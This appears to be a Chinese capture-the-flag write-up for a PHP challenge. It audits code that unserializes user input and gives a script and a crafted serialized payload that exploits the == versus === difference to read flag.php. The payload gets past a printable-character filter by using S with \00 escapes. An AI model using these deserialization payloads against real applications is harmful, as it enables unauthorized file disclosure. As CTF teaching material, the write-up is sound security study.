### buuoj_[网鼎杯2020 青龙组]AreUserialz

这个题拿到，首先进行简单的代码审计

```php
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

首先这里有个反序列化函数，而且这个is_valid函数判断ascii码位于32到125之间

```
public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
```

这个函数可以看到，只要op==2，就可以读到文件

```
function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
```

但是这里可以看到，当op===2时，会被置为1，但是在process函数里面，使用的是双等于号，也就是弱比较，但是这个怎么绕过===比较我是真不知道，看了下大佬的wp，好像直接op=2就可以了？？？

构造函数

```
<?php
class FileHandler {
    protected $op=2;
    protected $filename="flag.php";
    protected $content;
}

$a= new FileHandler();
$a=serialize($a);
echo $a;
```

得到序列化的str值

```
O:11:"FileHandler":3:{s:5:"*op";i:2;s:11:"*filename";s:8:"flag.php";s:10:"*content";N;}
```

![](https://pic.imgdb.cn/item/611a55645132923bf88a2f37.jpg)

但是%00被解释为ASCII码的时候是0，此时可以就用十六进制\00和S绕过,s->S

```
O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";s:10:"./flag.php";S:10:"\00*\00content";N;}
```

![](https://pic.imgdb.cn/item/611a55e95132923bf88c7be7.jpg)

完成

